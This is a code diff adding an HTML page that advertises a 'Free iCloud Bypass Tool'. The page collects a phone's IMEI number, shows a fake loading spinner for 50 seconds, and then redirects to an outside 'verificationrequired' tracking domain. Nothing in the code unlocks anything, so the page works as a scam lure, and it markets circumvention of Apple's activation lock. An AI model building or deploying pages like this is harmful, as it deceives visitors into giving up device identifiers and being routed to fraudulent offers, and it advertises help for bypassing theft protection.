@@ -1,1 +1,90 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free iCloud Unlocker</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            margin: 50px;
+            background: linear-gradient(to right, #c7e5ed, #6495bd);
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            margin: auto;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            text-align: center;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .loader {
+            display: none;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="./iclouds.png" alt="iCloud Unlocker Logo" class="logo">
+        <h2>Free iCloud Bypass Tool</h2>
+        <b>Enter IMEI Number</b>
+        <input type="text" id="imei" placeholder="Enter IMEI Number" maxlength="15" pattern="\d{15}" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <button onclick="startUnlock()">Unlock Now</button>
+        <div class="loader" id="loader"></div>
+    </div>
+    <script>
+        function startUnlock() {
+            var imei = document.getElementById("imei").value;
+            if (imei.length !== 15 || isNaN(imei)) {
+                alert("Please enter a valid 15-digit IMEI number.");
+                return;
+            }
+            document.getElementById("loader").style.display = "block";
+            setTimeout(function() {
+                window.location.href = "https://grptrkcr.com/verificationrequired0";
+            }, 50000); // 50 seconds
+        }
+    </script>
+</body>
+</html>
